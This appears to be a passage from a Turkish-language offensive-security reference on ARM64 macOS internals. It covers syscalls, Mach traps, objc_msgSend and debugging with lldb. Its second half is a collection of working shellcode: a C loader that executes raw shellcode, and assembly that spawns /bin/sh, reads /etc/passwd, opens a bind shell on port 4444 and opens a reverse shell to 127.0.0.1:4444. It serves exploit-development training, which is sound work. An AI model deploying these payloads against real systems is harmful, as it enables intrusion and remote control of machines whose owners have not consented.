#### Yürütme Durumu Kayıtları

- **`J`** ve **`T`** bitleri: **`J`** 0 olmalıdır ve eğer **`T`** 0 ise A32 talimat seti kullanılır, 1 ise T32 kullanılır.
- **IT Blok Durum Kaydı** (`ITSTATE`): Bunlar 10-15 ve 25-26 arasındaki bitlerdir. **`IT`** ile başlayan bir grup içindeki talimatlar için koşulları saklar.
- **`E`** biti: **endianness**'i gösterir.
- **Mod ve İstisna Maske Bitleri** (0-4): Mevcut yürütme durumunu belirler. **5.** bit, programın 32bit (1) veya 64bit (0) olarak çalışıp çalışmadığını gösterir. Diğer 4 bit, **şu anda kullanılan istisna modunu** temsil eder (bir istisna meydana geldiğinde ve işlenirken). Ayarlanan sayı, bu işlenirken başka bir istisna tetiklendiğinde **mevcut önceliği** gösterir.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Belirli istisnalar **`A`**, `I`, `F` bitleri kullanılarak devre dışı bırakılabilir. Eğer **`A`** 1 ise, **asenkron abortlar** tetiklenecektir. **`I`**, dış donanım **Kesme Taleplerine** (IRQ'lar) yanıt vermek için yapılandırır. F ise **Hızlı Kesme Talepleri** (FIR'lar) ile ilgilidir.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına göz atın. BSD syscalls **x16 > 0** olacaktır.

### Mach Tuşları

`mach_trap_table`'ı [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) dosyasında ve prototipleri [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) dosyasında kontrol edin. Mach tuşlarının maksimum sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach tuşları **x16 < 0** olacaktır, bu nedenle önceki listedeki numaraları **eksi** ile çağırmalısınız: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.

Bu (ve BSD) syscalls'ı çağırmayı bulmak için bir disassembler'da **`libsystem_kernel.dylib`** dosyasını da kontrol edebilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Not edin ki **Ida** ve **Ghidra**, sadece önbelleği geçerek **belirli dylib'leri** decompile edebilir.

> [!TIP]
> Bazen **decompile** edilmiş **`libsystem_kernel.dylib`** kodunu kontrol etmek, **kaynak kodunu** kontrol etmekten daha kolaydır çünkü birkaç syscalls'un (BSD ve Mach) kodu scriptler aracılığıyla üretilir (kaynak kodundaki yorumlara bakın) oysa dylib'de neyin çağrıldığını bulabilirsiniz.

### machdep çağrıları

XNU, makine bağımlı olarak adlandırılan başka bir çağrı türünü destekler. Bu çağrıların sayısı mimariye bağlıdır ve ne çağrılar ne de sayılar sabit kalacağına dair bir garanti yoktur.

### comm sayfası

Bu, her kullanıcı sürecinin adres alanına haritalanan bir çekirdek sahibi bellek sayfasıdır. Kullanıcı modundan çekirdek alanına geçişi, bu geçişin çok verimsiz olacağı kadar sık kullanılan çekirdek hizmetleri için syscalls kullanmaktan daha hızlı hale getirmek için tasarlanmıştır.

Örneğin, `gettimeofdate` çağrısı `timeval` değerini doğrudan comm sayfasından okur.

### objc_msgSend

Bu fonksiyonun Objective-C veya Swift programlarında kullanıldığını bulmak oldukça yaygındır. Bu fonksiyon, bir Objective-C nesnesinin bir yöntemini çağırmayı sağlar.

Parametreler ([belgelerde daha fazla bilgi](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Örneğe işaretçi
- x1: op -> Yöntemin seçici
- x2... -> Çağrılan yöntemin geri kalan argümanları

Bu nedenle, bu fonksiyona giden dalın önünde bir breakpoint koyarsanız, lldb'de neyin çağrıldığını kolayca bulabilirsiniz (bu örnekte nesne, bir komut çalıştıracak olan `NSConcreteTask`'tan bir nesneyi çağırır):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ortam değişkenini **`NSObjCMessageLoggingEnabled=1`** olarak ayarlamak, bu fonksiyon çağrıldığında `/tmp/msgSends-pid` gibi bir dosyaya kaydetmek mümkündür.
>
> Ayrıca, **`OBJC_HELP=1`** ayarlayarak ve herhangi bir ikili dosyayı çağırarak, belirli Objc-C eylemleri gerçekleştiğinde **log** için kullanabileceğiniz diğer ortam değişkenlerini görebilirsiniz.

Bu fonksiyon çağrıldığında, belirtilen örneğin çağrılan yöntemini bulmak gerekir, bunun için farklı aramalar yapılır:

- İyimser önbellek araması yapın:
- Başarılıysa, tamam
- runtimeLock (okuma) edin
- Eğer (realize && !cls->realized) sınıfı realize et
- Eğer (initialize && !cls->initialized) sınıfı initialize et
- Sınıfın kendi önbelleğini dene:
- Başarılıysa, tamam
- Sınıf yöntem listesini dene:
- Bulunduysa, önbelleği doldur ve tamam
- Üst sınıf önbelleğini dene:
- Başarılıysa, tamam
- Üst sınıf yöntem listesini dene:
- Bulunduysa, önbelleği doldur ve tamam
- Eğer (resolver) yöntem çözücüsünü dene ve sınıf aramasından tekrar et
- Eğer hala buradaysa (= diğer her şey başarısız oldu) yönlendiriciyi dene

### Shellcodes

Derlemek için:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Baytları çıkarmak için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Yeni macOS için:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**buradan**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.

{{#tabs}}
{{#tab name="adr ile"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="stack ile"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="linux için adr ile"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Cat ile oku

Amaç, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu nedenle ikinci argüman (x1) bir parametreler dizisidir (bellekte bu, adreslerin bir yığını anlamına gelir).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Bir fork'tan sh ile komut çağırın, böylece ana işlem öldürülmez.
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

**port 4444**'te [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) adresinden bind shell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Ters kabuk

From [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
